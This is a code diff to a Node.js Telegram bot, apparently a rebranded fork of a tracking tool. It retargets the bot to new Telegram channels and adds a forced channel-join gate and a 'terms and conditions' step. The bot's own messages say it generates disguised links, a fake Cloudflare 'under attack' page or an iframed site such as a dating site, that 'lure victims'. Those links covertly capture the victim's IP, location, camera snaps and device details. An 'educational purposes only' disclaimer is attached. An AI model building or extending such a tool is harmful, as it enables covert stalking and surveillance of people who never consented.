@@ -32,7 +32,7 @@ if(req.params.path != null){
 res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
 } 
 else{
-res.redirect("https://t.me/th30neand0nly0ne");
+res.redirect("https://t.me/RenusHackingArmy");
 }
 
          
@@ -50,7 +50,7 @@ if(req.params.path != null){
 res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
 } 
 else{
-res.redirect("https://t.me/th30neand0nly0ne");
+res.redirect("https://t.me/RenusHackingArmy");
 }
 
          
@@ -87,26 +87,35 @@ if (msg.text == "/start") {
     }
 
     if (!isMemberOfAllChannels) {
-      var joinMessage = "Please join our channels first:";
-      var joinButtons = channels.map(channel => {
-        return [{ text: `Join ${channel}`, url: `https://t.me/${channel.substring(1)}` }];
-      });
+      var joinMessage = `Welcome ${msg.chat.first_name} ! You can use this bot to track any person's device just through a simple link. It can gather information like IP address, location, camera snaps, battery level, network info, and a wide range of information about their device, plus many more benefits.\n\nHey user, you have to join both these channels. Otherwise, this bot will not work. If you have joined both channels, then tap the "JOINED" button below to confirm your membership.`;
+      const channelLinks = [
+  'https://t.me/RenusHackingArmy',
+  'https://t.me/RenusBotsChannel',
+  // Add more channel links here
+];
 
-      var joinMarkup = {
-        reply_markup: JSON.stringify({
-          "inline_keyboard": joinButtons
-        })
-      };
+const joinButtons = channelLinks.map(link => {
+  return [
+    { text: `Join Channel`, url: link },
+    { text: `Joined`, callback_data: 'start_command' }
+  ];
+});
+
+const joinMarkup = {
+  reply_markup: JSON.stringify({
+    inline_keyboard: joinButtons
+  })
+};
 
       bot.sendMessage(chatId, joinMessage, joinMarkup);
     } else {
       var m = {
         reply_markup: JSON.stringify({
-          "inline_keyboard": [[{ text: "Create Link", callback_data: "crenew" }]]
+          "inline_keyboard": [[{ text: "ACCEPT TERMS AND CONDITIONS", callback_data: "terms" }]]
         })
       };
 
-      bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to track down people just through a simple link.\nIt can gather information like location, device info, camera snaps.\n\nType /help for more info.`, m);
+      bot.sendMessage(chatId, `Read the terms and conditions of this bot. If you use this bot so you agree to abide by our terms and conditions. This bot is made available for educational purposes only. I am not responsible for any illegal activities that result from the use of this bot. If you use this bot, you do so at your own risk. And if it causes any harm to anyone, then you yourself will be responsible for it. And thank you for using our service.`, m);
     }
 }
 
@@ -115,26 +124,25 @@ else if(msg.text=="/create"){
 createNew(chatId);
 }
 else if(msg.text=="/help"){
-bot.sendMessage(chatId,` Through this bot you can track people just by sending a simple link.\n\nSend /create
-to begin , afterwards it will ask you for a URL which will be used in iframe to lure victims.\nAfter receiving
-the url it will send you 2 links which you can use to track people.
-\n\nSpecifications.
-\n1. Cloudflare Link: This method will show a cloudflare under attack page to gather informations and afterwards victim will be redirected to destinationed URL.
-\n2. Webview Link: This will show a website (ex bing , dating sites etc) using iframe for gathering information.
-( ⚠️ Many sites may not work under this method if they have x-frame header present.Ex https://google.com )
-\n\nThe project is OSS at: https://github.com/Th30neAnd0nly/TrackDown
+bot.sendMessage(chatId,`Join the all channel to start the bot. If you have not joined then join first. After that click on the button of term and condition. Now you create a URL. You can enter any URL that will be used in the iframe to attract potential victims. Once you provide the URL, the bot will send you two links that can be used to track individuals.\n\nThe first link, known as the Cloudflare link, displays a fake "under attack" page that collects information about the victim before redirecting them to the intended destination. The second link, known as the Webview link, displays a website (such as Bing or a dating site) within an iframe to collect information. Please note that some sites may not work with the Webview link due to an x-frame header present.
 `);
 }
   
   
 });
 
-bot.on('callback_query',async function onCallbackQuery(callbackQuery) {
-bot.answerCallbackQuery(callbackQuery.id);
-if(callbackQuery.data=="crenew"){
-createNew(callbackQuery.message.chat.id);
-} 
+bot.on('callback_query', async function onCallbackQuery(callbackQuery) {
+  bot.answerCallbackQuery(callbackQuery.id);
+
+  if (callbackQuery.data === "crenew") {
+    createNew(callbackQuery.message.chat.id);
+  } else if (callbackQuery.data === "terms") {
+    aterms(callbackQuery.message.chat.id);
+  }
 });
+
+
+
 bot.on('polling_error', (error) => {
 //console.log(error.code); 
 });
@@ -175,15 +183,15 @@ for(var c in y){
 g+=y[c]+"\n";
 }
   
-bot.sendMessage(cid, `New links has been created successfully.You can use any one of the below links.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`,m);
+bot.sendMessage(cid, `New links has been created successfully.You can use any one of the below links.\nYour old URL: [Click Here](${msg})\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`,m);
 }
 else{
 
-bot.sendMessage(cid, `New links has been created successfully.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`,m);
+bot.sendMessage(cid, `New links has been created successfully.\nYour old URL: [Click Here](${msg})\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`,m);
 }
 }
 else{
-bot.sendMessage(cid,`⚠️ Please Enter a valid URL , including http or https.`);
+bot.sendMessage(cid,`⚠️ Please enter a valid URL, including http or https. Ex- https://www.google.com`);
 createNew(cid);
 
 }  
@@ -197,8 +205,20 @@ reply_markup:JSON.stringify({"force_reply":true})
 bot.sendMessage(cid,`🌐 Enter Your URL`,mk);
 }
 
-
-
+function aterms(chatId) {
+  // Define the message you want to send
+  const message = "You can use this bot to track any persons device just through a simple link. It can gather information like IP address, location and camera snaps, battery level, network info and a wide range of information about their device, plus many more benefits.\n\nNow you create a URL. click on the create link given below. You can now enter any URL in Create Link that will be used to lure potential victims. once you provide the URL to the bot, the bot will send you two links which can be used to track individuals.";
+var m = {
+        reply_markup: JSON.stringify({
+          "inline_keyboard": [
+          [{ text: "Create Link", callback_data: "crenew" }],
+           [{ text: "Help Support", url: "https://t.me/RenusBotsGroup" }]
+      ]
+        })
+      };
+  // Send the message to the user
+  bot.sendMessage(chatId, message, m);
+}
 
 
 app.get("/", (req, res) => {
